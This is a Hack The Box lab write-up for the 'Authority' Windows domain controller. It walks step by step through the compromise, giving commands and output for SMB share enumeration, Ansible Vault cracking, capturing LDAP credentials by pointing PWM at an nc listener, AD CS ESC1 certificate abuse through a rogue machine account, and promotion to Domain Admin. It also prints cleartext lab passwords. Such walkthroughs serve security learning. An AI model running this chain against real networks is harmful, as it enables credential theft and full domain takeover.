Author: Faridd

### HTB Write-Up: Authority

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Authority)   |
| Difficulty | Medium                                                            |
| OS         | Windows                                                           |
| Date       | November 09, 2026                                                 |

---

#### Table of Contents
1. [Reconnaissance — Rustscan & Nmap](#1-reconnaissance--rustscan--nmap)
2. [Enumeration — Anonymous SMB Share & PWM Service Discovery](#2-enumeration--anonymous-smb-share--pwm-service-discovery)
3. [Credential Discovery — Ansible Vault Cracking](#3-credential-discovery--ansible-vault-cracking)
4. [Initial Access — LDAP Credential Leak via PWM's "Test LDAP Profile"](#4-initial-access--ldap-credential-leak-via-pwms-test-ldap-profile)
5. [Privilege Escalation (Part 1) — AD CS ESC1 via Rogue Computer Account](#5-privilege-escalation-part-1--ad-cs-esc1-via-rogue-computer-account)
6. [Privilege Escalation (Part 2) — LDAP Shell to Domain Admin](#6-privilege-escalation-part-2--ldap-shell-to-domain-admin)

---

#### 1. Reconnaissance — Rustscan & Nmap

```bash
rustscan -a 10.129.229.56 --ulimit=5000
```

**Open Ports:**

```
Open 10.129.229.56:53
Open 10.129.229.56:80
Open 10.129.229.56:88
Open 10.129.229.56:135
Open 10.129.229.56:139
Open 10.129.229.56:389
Open 10.129.229.56:445
Open 10.129.229.56:464
Open 10.129.229.56:593
Open 10.129.229.56:636
Open 10.129.229.56:5985
Open 10.129.229.56:8443
Open 10.129.229.56:9389
```

```bash
sudo nmap -sC -sV -p80,139,389,445,464,593,636,8443,9389 -A 10.129.229.56
```

**Result (relevant extract):**

```
80/tcp   open  http          Microsoft IIS httpd 10.0
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb)
445/tcp  open  microsoft-ds?
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb)
8443/tcp open  ssl/https-alt
| fingerprint-strings:
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
```

The target is a Domain Controller for `authority.htb`. Port 8443 redirects to `/pwm` — identifying **PWM**, an open-source self-service password management web application, as a service running on this host. The domain was added to `/etc/hosts`:

```bash
echo '10.129.229.56 authority.htb dc.authority.htb dc' | sudo tee -a /etc/hosts
```

---

#### 2. Enumeration — Anonymous SMB Share & PWM Service Discovery

##### 2.1 — Guest SMB Access

```bash
netexec smb 10.129.229.56 -u "guest" -p '' --shares
```

**Result:**

```
[+] authority.htb\guest: 
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
Department Shares                 
Development     READ            
IPC$            READ            Remote IPC
NETLOGON                        Logon server share 
SYSVOL                          Logon server share 
```

The **`Development`** share was readable with guest access.

##### 2.2 — Exploring the Development Share

```bash
smbclient //10.129.229.56/Development -U "guest%"
```

Given the PWM login page seen on port 8443, the `PWM` subfolder under `\Automation\Ansible\` was the natural target to investigate.

```bash
cat '\Automation\Ansible\PWM\ansible.cfg'
```

**Result:**

```ini
[defaults]
hostfile = ansible_inventory
remote_user = svc_pwm
```

```bash
cat '\Automation\Ansible\PWM\ansible_inventory'
```

**Result:**

```yaml
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
```

These credentials (`administrator:Welcome1`) did not work — likely stale test values. The search continued for other password-related content across the share.

---

#### 3. Credential Discovery — Ansible Vault Cracking

##### 3.1 — Spidering for Password-Related Content

```bash
netexec smb 10.129.229.56 -u 'guest' -p '' --spider Development --pattern "password" --content
```

**Result:**

```
//10.129.229.56/Development/Automation/Ansible/PWM/README.md
//10.129.229.56/Development/Automation/Ansible/PWM/defaults/main.yml
```

```bash
cat main.yml
```

**Result:**

```yaml
pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          ...
pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          ...
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          ...
```

Three secrets — `pwm_admin_login`, `pwm_admin_password`, and `ldap_admin_password` — were stored as **Ansible Vault** blocks. The `$ANSIBLE_VAULT;1.1;AES256` header confirms these are AES-256-encrypted and require the vault's password (not the plaintext secret itself) to decrypt.

##### 3.2 — Extracting the Vault Block

```bash
echo '$ANSIBLE_VAULT;1.1;AES256
          31356338...' > text
sed -e 's/^[ \t]*//' text > vault.hash
```

##### 3.3 — Converting for Cracking

```bash
ansible2john vault.hash > hash
```

##### 3.4 — Cracking the Vault Password

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Result:**

```
!@#$%^&*         (vault.hash)
```

The Ansible Vault's master password was cracked: **`!@#$%^&*`**.

##### 3.5 — Decrypting the Secrets

```bash
echo '!@#$%^&*' > pass.txt
ansible-vault view vault.hash --vault-password-file pass.txt
```

**Result:**

```
pWm_@dm!N_!23
```

The same process was repeated for the other two vault blocks, recovering:

```
pwm_admin_login    = svc_pwm
pwm_admin_password = pWm_@dm!N_!23
ldap_admin_password = DevT3st@123
```

---

#### 4. Initial Access — LDAP Credential Leak via PWM's "Test LDAP Profile"

The recovered `pwm_admin_password` was tested against several services and worked on **PWM's configuration editor** at port 8443.

##### 4.1 — Locating the LDAP Connection Test Feature

Inside PWM's configuration editor, under **LDAP → LDAP Directories → Default → Connection**, there is a **"Test LDAP Profile"** button. Clicking it causes PWM's backend to send an authenticated LDAP bind request to whatever URL is configured in the LDAP URLs field — which can be edited by an administrator of the panel.

##### 4.2 — Redirecting the LDAP Test to an Attacker Listener

The configured URL (`ldaps://authority.htb.corp:636`) was changed to point at the attacker machine over **plain LDAP** instead of LDAPS (`ldap://10.10.14.25:389`), since LDAPS would have encrypted the credentials in transit — downgrading to plaintext LDAP exposes them directly:

```bash
sudo nc -lvnp 389
```

Clicking "Test LDAP Profile" caused PWM's backend to connect to the listener and attempt an LDAP bind with its configured service account credentials, sent in the clear:

**Result:**

```
connect to [10.10.14.25] from (UNKNOWN) [10.129.229.56] 53370
CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
lDaP_1n_th3_cle4r!
```

Plaintext credentials for **`svc_ldap`** were captured: `lDaP_1n_th3_cle4r!`.

##### 4.3 — Shell & User Flag

```bash
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> type user.txt
59637824dfbe521f0cf52d8b59d3d5a1
```

##### 4.4 — Checking Group Membership

```powershell
whoami /all
```

**Result (relevant extract):**

```
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574
```

`svc_ldap` belongs to a group related to **AD CS** (Certificate Service DCOM Access), prompting a check for certificate template misconfigurations.

---

#### 5. Privilege Escalation (Part 1) — AD CS ESC1 via Rogue Computer Account

##### 5.1 — Finding the Vulnerable Template

```bash
certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable
```

**Result:**

```
[!] Vulnerabilities
  ESC1 : Enrollee supplies subject and template allows client authentication.
```

An **ESC1** condition was found: a certificate template allows the requester to supply an arbitrary Subject Alternative Name (impersonating any identity, including Administrator) while also permitting client authentication — but enrollment rights for the relevant template require a domain-joined machine account rather than `svc_ldap` directly.

##### 5.2 — Creating a Rogue Machine Account

Since no machine account was yet under attacker control, one was created using `svc_ldap`'s rights (machine account creation is generally permitted for authenticated domain users, subject to quota):

```bash
impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -computer-name 'ATTACKBOX$' -computer-pass 'R0gueC0mputer123!'
```

**Result:**

```
[*] Successfully added machine account ATTACKBOX$ with password R0gueC0mputer123!.
```

##### 5.3 — Requesting a Certificate as Administrator

```bash
certipy req -u 'ATTACKBOX$@authority.htb' -p 'R0gueC0mputer123!' -dc-ip 10.129.229.56 -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb
```

**Result:**

```
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

Using the new rogue computer account's enrollment rights on the `CorpVPN` template, a certificate was issued claiming the Administrator's UPN, thanks to the ESC1 misconfiguration allowing enrollee-supplied subjects.

---

#### 6. Privilege Escalation (Part 2) — LDAP Shell to Domain Admin

##### 6.1 — Authenticating with the Certificate

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell
```

**Result:**

```
[*] Connecting to 'ldaps://10.129.229.56:636'
[*] Authenticated to '10.129.229.56' as: 'u:HTB\Administrator'
Type help for list of commands
```

The certificate authenticated successfully over LDAPS/Schannel, giving an interactive LDAP shell as the Administrator identity.

##### 6.2 — Promoting svc_ldap to Domain Admin

Rather than resetting the Administrator password, the LDAP shell's built-in group-management command was used to add the already-controlled `svc_ldap` account directly into **Domain Admins**:

```
# add_user_to_group svc_ldap "Domain Admins"
Adding user: svc_ldap to group Domain Admins result: OK
```

##### 6.3 — Confirming Elevated Access & Root Flag

```bash
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

```powershell
whoami /groups
```

**Result (relevant extract):**

```
HTB\Domain Admins                          Group            S-1-5-21-622327497-3269355298-2248959698-512
```

`svc_ldap` was now confirmed as a Domain Admin.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
1b73d470639095f77148896e2c003736
```
